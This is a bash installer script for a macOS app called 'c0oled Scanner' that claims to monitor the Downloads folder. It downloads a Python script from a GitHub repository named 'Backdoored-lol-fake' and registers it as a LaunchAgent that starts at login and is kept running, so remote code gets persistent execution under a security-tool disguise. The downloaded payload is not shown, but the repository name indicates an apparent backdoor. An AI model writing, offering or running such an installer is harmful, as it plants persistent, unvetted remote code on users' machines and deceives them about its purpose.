#!/bin/bash
set -euo pipefail

if [[ "$(uname -s)" != "Darwin" ]]; then
  echo "c0oled Scanner is for macOS."
  exit 1
fi

APP_HOME="$HOME/Applications"
APP="$APP_HOME/c0oled Scanner.app"
DATA="$HOME/Library/Application Support/c0oled-Scanner"
AGENT="$HOME/Library/LaunchAgents/com.c0oled.scanner.plist"
BASE="https://raw.githubusercontent.com/ttmeticks-source/Backdoored-lol-fake/main"

mkdir -p "$APP_HOME" "$DATA" "$DATA/Logs" "$DATA/Quarantine" "$HOME/Library/LaunchAgents"
echo "Installing c0oled Scanner (no Homebrew required)..."
curl -fsSL "$BASE/scanner.py" -o "$DATA/scanner.py"
chmod 700 "$DATA/scanner.py"

# Create a genuine clickable macOS .app using Apple's built-in AppleScript compiler.
TMP_SCRIPT="$(/usr/bin/mktemp)"
cat > "$TMP_SCRIPT" <<'APPLESCRIPT'
on run
    set userId to do shell script "/usr/bin/id -u"
    do shell script "/bin/launchctl kickstart gui/" & userId & "/com.c0oled.scanner"
    display notification "Local Downloads monitoring is running." with title "c0oled Scanner"
end run
APPLESCRIPT

rm -rf "$APP"
/usr/bin/osacompile -o "$APP" "$TMP_SCRIPT"
rm -f "$TMP_SCRIPT"
/usr/bin/plutil -replace CFBundleIdentifier -string com.c0oled.scanner.app "$APP/Contents/Info.plist"
/usr/bin/plutil -replace CFBundleName -string "c0oled Scanner" "$APP/Contents/Info.plist"

cat > "$AGENT" <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
 <key>Label</key><string>com.c0oled.scanner</string>
 <key>ProgramArguments</key>
 <array><string>/usr/bin/python3</string><string>$DATA/scanner.py</string></array>
 <key>RunAtLoad</key><true/>
 <key>KeepAlive</key><true/>
 <key>StandardOutPath</key><string>$DATA/Logs/agent.out.log</string>
 <key>StandardErrorPath</key><string>$DATA/Logs/agent.err.log</string>
</dict>
</plist>
EOF

launchctl bootout "gui/$(id -u)/com.c0oled.scanner" >/dev/null 2>&1 || true
launchctl bootstrap "gui/$(id -u)" "$AGENT"
launchctl enable "gui/$(id -u)/com.c0oled.scanner"

echo "Installed: $APP"
echo "Open it from Applications. No Homebrew or ClamAV required."
echo "First run checks existing Downloads; later runs skip unchanged files."
echo "Quarantine: $DATA/Quarantine"
echo "Logs: $DATA/Logs"
